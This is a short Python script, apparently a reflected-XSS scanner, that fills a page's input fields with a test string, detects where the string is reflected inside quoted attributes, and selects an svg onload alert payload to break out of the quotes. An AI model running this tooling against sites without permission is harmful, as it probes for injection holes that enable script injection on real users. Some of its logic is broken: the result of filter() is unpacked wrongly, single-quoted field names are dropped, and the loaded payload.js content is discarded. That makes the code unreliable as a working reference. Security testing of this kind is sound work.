import sys
import urllib
import requests
import re
from functools import reduce

test = "6ix8uzz"
headers = {
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

single_quote_payload = "\'><svg onload=\'init(); function init(){alert(0)}\'"
double_quote_payload = "\"><svg onload=\'init(); function init(){alert(0)}\'"

input_reg = '<input.*?name=\'(.*?)\'.*?>|<input.*?name="(.*?)".*?>'

# contexts where the test input can land in
contexts = [
    {
        "name" : "quotes",
        "match_str" : f'<.*?=\"({test})\".*?>|<.*?=\'({test})\'.*?>'
    }
]

# is this the pythonic way ... idk
payload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))

if len(sys.argv) < 2:
    print("usage: python xss.py url")
    sys.exit()

url = sys.argv[1]
if "http://" not in url:
    url = "http://" + url

response = requests.get(url, headers=headers)

data = {}
matches = re.findall(input_reg, response.text)
for match in matches:
    data[match[1]] = test

test_response = requests.get(url, headers=headers, params=data)

# look for test string in the response
for line in test_response.text.split('\n'):
    # assume ctxts are mututally exclusive 
    injection_sites, ctx = filter(lambda x: x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
    if ctx == "quotes":
        double_quote, single_quote = injection_sites.group(1,2)
        print(single_quote, double_quote)
        payload = single_quote_payload if single_quote else double_quote_payload
        print("payload: " + payload)



